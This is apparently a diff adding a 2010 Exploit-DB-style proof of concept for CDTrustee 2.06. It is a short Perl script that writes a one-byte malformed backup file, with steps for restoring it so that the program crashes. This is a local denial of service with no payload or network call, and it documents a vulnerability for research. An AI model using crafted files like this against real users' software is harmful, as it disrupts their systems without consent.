@@ -1,0 +1,36 @@
+# Exploit Title: CDTrustee .BAK Local Crash POC
+# Date: March 30, 2010 
+# Software Link: [http://www.base40.com/cdtDownload.html]
+# Version: 2.06
+# Tested on: WinXP SP3 and Windows 7
+# Cost: 39.95 USD
+# Author: [anonymous]
+# Site: [http://www.setfreesecurity.com]
+#
+#
+# Usage: Install software, run this script it will create
+# CDTrustBackup.BAK, the file must be this name to restore.
+# Click File -> Restore Backup File -> Locate CDTrustBackup.BAK
+# Click OK -> OK -> OK -> Restore Complete -> OK
+# Click on Playlist Menu At Top (Or almost any other Menu -> Sub Menu or button)
+# Crash will occur, Thats all for now! 
+#
+# For to be carnally minded is death; but to be spiritually minded is life and peace.
+# Rom. 8:6
+# Greetz: GOD, TS aka br34dcrumbs, and This Coffee that I'm drinking
+# Thanks to the Exploit-DB crew for the inspiration
+#
+#
+#!/usr/bin/perl
+
+print "Creating CDTrustBackup.BAK file\n";
+
+my $bak = "\x41";
+my $file = "CDTrustBackup.BAK";
+
+open (FILE, ">$file");
+print FILE "$bak";
+
+print "Usage: File -> Restore Backup File -> Locate CDTrustBackup.BAK\n";
+print "Click on Playlist Menu\n";
+print "BOOM!\n"
